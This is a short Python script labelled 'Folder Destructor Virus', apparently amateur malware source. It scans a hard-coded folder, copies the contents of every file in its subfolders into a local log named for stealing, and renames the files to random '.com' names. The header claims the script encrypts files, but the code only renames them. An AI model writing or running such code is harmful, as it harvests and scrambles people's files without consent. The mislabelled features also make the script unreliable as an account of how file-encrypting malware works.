# #### Virus-3: Folder Destructor Virus
# Features:
# 1. Scan all the directories
# 3. Steal the contents of the folder
# 2. Encrypt the files

import os
import numpy as np
import shutil
import string

lcase=string.ascii_lowercase[:26]
ucase=string.ascii_uppercase[:26]
num="0123456789"

def main():
    dr="D:/Execution/1/"
    bkdr=dr+"bak/"
    os.chdir(dr)
    drlist=os.listdir(dr)
    ln=len(drlist)
    #print(drlist)
    des=[]
    try:
        logsteal=open(dr+"log3.txt","a+")
    except:
        logsteal=open(dr+"log3.txt","w+")
    for i in drlist:
        if os.path.isdir(dr+i)==True:
            des.append(1)
        else:
            des.append(0)
    #print(des)
    for i in range(len(des)):
        if des[i]==1:
            drmod=dr+drlist[i]+"/"
            drmodlist=os.listdir(drmod)
            for j in drmodlist:
                filename=drmod+j
                data=open(filename,"r")
                content=data.read()
                logsteal=open(dr+"log3.txt","a+")
                logsteal.write("\n"+"Content of: "+filename+"\n"+content)
                logsteal.close()
                data.close()
                x=0
    logsteal.close()
    print("Present Directory(main()): \n",os.getcwd())
    print(drlist)
    os.chdir(dr[:3])
    print("Present Directory(main()): \n",os.getcwd())
        
    
    for i in drlist:
        curdr=dr+i+"/"
        curlist=os.listdir(curdr)
        print(curlist)
        os.chdir(dr)
        print("Present Directory(main()): \n",os.getcwd())
        #shutil.rmtree(curdr)
        for k in curlist:
            inds=np.random.randint(0,len(lcase))
            indi=np.random.randint(0,len(num))
            print("File accessing---->",k)
            os.replace(curdr+k, curdr+lcase[inds]+ucase[inds]+num[indi]+".com")
        


if __name__=="__main__":
    main()
